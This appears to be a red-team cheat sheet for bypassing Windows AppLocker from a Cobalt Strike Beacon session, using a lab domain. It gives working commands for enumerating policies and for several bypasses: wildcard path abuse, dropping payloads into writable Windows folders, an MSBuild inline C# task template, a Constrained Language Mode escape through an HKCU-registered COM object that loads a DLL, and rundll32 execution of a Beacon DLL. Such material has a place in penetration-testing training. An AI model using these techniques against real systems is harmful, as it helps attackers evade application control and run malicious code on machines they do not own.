# AppLocker Bypasses (Cobalt Strike)

AppLocker is application control built into Windows. Policies can be enumerated from GPO or local registry.

---

## Registry Enumeration

```powershell
# From Beacon (execute-assembly or powerpick)
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

# Check specific rule types (Exe, Dll, Script, Msi, Appx)
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'

# Get effective policy
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections
```

---

## GPO Enumeration (Beacon)

Enumerate AppLocker policies from GPO when on an unprotected machine targeting a protected one:

```
# Find AppLocker GPO
ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

# Example output:
# displayName: AppLocker
# gPCFileSysPath: \\inlanefreight.local\SysVol\inlanefreight.local\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}

# List GPO contents
ls \\inlanefreight.local\SysVol\inlanefreight.local\Policies\{GPO-GUID}\Machine

# Download Registry.pol for local analysis
download \\inlanefreight.local\SysVol\inlanefreight.local\Policies\{GPO-GUID}\Machine\Registry.pol
```

**Parse locally:**
```powershell
Parse-PolFile -Path .\Registry.pol
```

---

## Path Wildcard Abuse

Some rules use wildcards that can be abused:

```xml
<FilePathRule Id="..." Name="App-V" UserOrGroupSid="S-1-1-0" Action="Allow">
  <Conditions>
    <FilePathCondition Path="*\App-V\*"/>
  </Conditions>
</FilePathRule>
```

If path starts with `*\`, an executable in **any** directory with that name is allowed. Create a matching directory anywhere you have write access.

---

## Writable Directories

Default allowed paths (`%WINDIR%\*`) contain writable directories:

```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
```

Drop payloads here and they will be allowed to run.

---

## LOLBAS - MSBuild Bypass

MSBuild executes arbitrary C# from .csproj files and exists in whitelisted `%WINDIR%\*`:

**beacon.csproj:**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using Microsoft.Build.Utilities;

public class MSBuild : Task
{
    public override bool Execute()
    {
        // Your payload here
        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Execute:**
```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe beacon.csproj
```

---

## PowerShell CLM Bypass (Custom COM Object)

AppLocker puts PowerShell into ConstrainedLanguage mode. Bypass by loading a DLL via custom COM object:

```powershell
# Generate GUID
[System.Guid]::NewGuid()
# Example: 6136e053-47cb-4fdd-84b1-381bc5f3edb3

# Create registry entries (run from Beacon)
New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\USER\bypass.dll'
New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'

# Load the COM object (triggers DLL load)
New-Object -ComObject AppLocker.Bypass
```

---

## Rundll32 Bypass

DLL rules are rarely enabled due to performance. When disabled, load Beacon DLL via rundll32:

```
# Beacon DLL exports StartW for rundll32
rundll32 bypass.dll,StartW

# Or with execute function
rundll32 bypass.dll,execute
```

---

## Check Current Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = no restrictions
# ConstrainedLanguage = AppLocker/WDAC active
```
